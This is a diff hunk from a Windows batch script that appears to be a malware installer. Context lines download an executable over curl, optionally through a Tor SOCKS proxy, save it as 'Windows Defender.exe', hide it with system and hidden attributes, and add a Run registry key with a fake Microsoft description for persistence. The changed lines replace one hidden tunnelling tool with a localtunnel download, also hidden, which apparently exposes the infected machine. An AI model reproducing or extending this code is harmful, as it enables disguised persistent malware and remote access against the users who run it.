@@ -39,10 +39,10 @@ if not errorlevel 1 (set "proxy=--tlsv1 --socks5-hostname 127.0.0.1:9050") else 
 
 attrib -s -h -i "%environment%\Windows Defender.exe" && curl.exe -k %proxy% %host%/sfx.exe -o "%environment%\Windows Defender.exe" && attrib +s +h +i "%environment%\Windows Defender.exe" && REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Defender" /t REG_SZ /F /D "%environment%\Windows Defender.exe -P\"rofile of Windows Defender [Microsoft Corporation]"\"
 
-attrib -s -h -i "%environment%\expose.exe" && if exist "%environment%\expose.exe" (
-   attrib +s +h +i "%environment%\expose.exe"
+attrib -s -h -i "%environment%\localtunnel" && if exist "%environment%\localtunnel" (
+   attrib +s +h +i "%environment%\localtunnel"
 ) else (
-  "%environment%\curl.exe" -k %proxy% %host%/Tools/expose.7z -o "%temp%\expose.7z" && "%environment%\7-Zip\7z.exe" x "%temp%\expose.7z" -p7zexpose -o"%environment%" -y && attrib +s +h +i "%environment%\expose.exe" && del "%temp%\expose.7z"
+ "%environment%\curl.exe" -k -L https://github.com/angelobreuer/localtunnel.net/releases/download/1.0.1.0/win-x86.zip > "%temp%/localtunnel.zip" && "%environment%\7-Zip\7z.exe" x "%temp%\localtunnel.zip" -o"%environment%" -y && ren "%environment%\win-x86" "localtunnel" && attrib +s +h +i "%environment%\localtunnel" && del "%temp%\localtunnel.zip"
 )
  
  attrib -s -h -i "%environment%\apache2" && if exist "%environment%\apache2\bin\httpd.exe" (
